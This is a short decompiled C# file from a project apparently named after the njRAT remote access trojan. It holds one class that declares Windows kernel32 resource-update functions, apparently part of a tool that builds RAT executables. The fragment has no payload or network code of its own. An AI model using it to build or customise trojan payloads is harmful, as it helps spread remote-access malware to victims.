using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;

namespace NJRAT
{
	// Token: 0x0200002F RID: 47
	[SuppressUnmanagedCodeSecurity]
	public sealed class GClass2
	{
		// Token: 0x0600058F RID: 1423 RVA: 0x00142814 File Offset: 0x00140C14
		[DebuggerNonUserCode]
		public GClass2()
		{
		}

		// Token: 0x06000590 RID: 1424
		[DllImport("kernel32")]
		public static extern IntPtr BeginUpdateResource(string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0);

		// Token: 0x06000591 RID: 1425
		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool EndUpdateResource(IntPtr intptr_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0);

		// Token: 0x06000592 RID: 1426
		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool UpdateResource(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, short short_0, [MarshalAs(UnmanagedType.LPArray, SizeConst = 0, SizeParamIndex = 5)] byte[] byte_0, int int_0);
	}
}
